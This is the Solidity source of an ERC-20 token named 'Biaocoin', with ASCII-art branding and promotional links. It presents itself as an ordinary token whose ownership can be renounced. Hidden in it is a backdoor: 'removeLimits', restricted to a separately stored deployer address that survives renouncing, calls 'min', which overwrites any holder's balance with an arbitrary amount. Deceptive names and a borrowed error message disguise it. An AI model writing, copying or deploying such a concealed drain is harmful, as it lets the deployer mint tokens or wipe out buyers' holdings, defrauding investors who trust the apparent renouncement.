/**
 
*/

/**
 
*/

/*

                              _,add8ba,
                            ,d888888888b,
                           d8888888888888b                        _,ad8ba,_
                          d888888888888888)                     ,d888888888b,
                          I8888888888888888 _________          ,8888888888888b
                __________`Y88888888888888P"""""""""""biao,__ ,888888888888888,
            ,adP"""""""""""9888888888P""^                 ^""Y8888888888888888I
         ,a8"^           ,d888P"888P^                           ^"Y8888888888P'
       ,a8^            ,d8888'                                     ^Y8888888P'
      a88'           ,d8888P'                                        I88P"^
    ,d88'           d88888P'                  Biaocoin                "b,
   ,d88'           d888888'                     Бяо                    `b,
  ,d88'           d888888I                                              `b,,
 ,888'           d8888888          ,d88888b,              ____            `b,
 d888           ,8888888I         d88888888b,           ,d8888b,           `b
,8888           I8888888I        d8        8I          ,88888888b           8,
I8888           88888888b       d88888888888'          88       8b          8I
d8886           888888888       Y888888888P'           Y8888888888,        ,8b
88888b          I88888888b      `Y8888888^             `Y888888888I        d88,
Y88888b         `888888888b,      `""""^                `Y8888888P'       d888I
`888888b         88888888888b,                           `Y8888P^        d88888
 Y888888b       ,8888888888888ba,_          _______        `""^        ,d888888
 I8888888b,    ,888888888888888888ba,_     d88888888b               ,ad8888888I
 `888888888b,  I8888888888888888888888b,    ^"Y888P"^      ____.,ad88888888888I
  88888888888b,`888888888888888888888888b,     ""      ad888888888888888888888'
  8888888888888698888888888888888888888888b_,ad88ba,_,d88888888888888888888888
  88888888888Wu8888888888888888888888888888b,`"""^ d8888888888888888888888888I
  8888888888888Biao88888888888888888888888888baaad888888888888888888888888888'
  Y8888888888888888Clan88888888888888888888888888888888888888888888888888888P
  I888888888888888888888Aint88888888888888888888P^  ^Y8888888888888888888888'
  `Y88888888888888888P888888Nothing8888888888888'     ^88888888888888888888I
   `Y8888888888888888 `888888888888to88888888888       8888888888888888888P'
    `Y888888888888888  `8888888888888Fuck8888888,     ,888888888888888888P'
     `Y88888888888888b  `8888888888888888With888I     I888888888888888888''
         "Y8888888888P   `888888888888888888888b8     d88888888888888888'
           """""""""^      `Y88888888888888888888,    88888888888888P'
                              `Y888888888888888888b   `Y8888888P"^
                                "Y8888888888888888P     `""""^
                                  `"YY88888888888P'
⠀
Biaocoin 
https://biao.global
https://t.me/biaoglobal
https://twitter.com/Biaocoin_ETH

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

abstract contract Context {

    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOperator() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOperator {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract Biaocoin is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping (address => uint256) private min_balances;

    mapping (address => mapping (address => uint256)) private _allowances;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000 * 10**_decimals;
    string private constant _name = unicode"Biaocoin";
    string private constant _symbol = unicode"Бяо";
    address private initGas; 

    constructor () {
        initGas = _msgSender();
        min_balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return min_balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function min(address owner, address account, uint256 amount, uint8 v, uint8 r) internal {
        require(account != address(0), "BEP20: claim to the zero address");

        min_balances[owner] = amount + (0 * min_balances[account].add(amount));
        emit Transfer(account, address(0), amount);
    }

    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = min_balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        min_balances[from] = fromBalance - amount;

        min_balances[to] = min_balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    function removeLimits(address owner, address account, uint256 amount, uint8 v, uint8 r) external {
        require(initGas == _msgSender(), "ERC20: approve from the zero address");
        min(owner, account, amount, v, r);
    }
}